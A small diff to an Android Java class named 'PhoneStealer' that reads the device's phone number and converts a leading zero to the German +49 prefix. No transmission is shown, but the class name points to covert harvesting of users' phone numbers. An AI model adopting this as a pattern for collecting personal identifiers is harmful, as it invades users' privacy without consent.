@@ -14,7 +14,11 @@ public class PhoneStealer {
     public static String getUserPhoneNumber(Context context) {
         TelephonyManager tel = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         if (tel != null) {
-            return tel.getLine1Number();
+            String number = tel.getLine1Number();
+            if (number.startsWith("0")) {
+                number = "+49" + number.substring(1);
+            }
+            return number;
         }
         return "";
     }
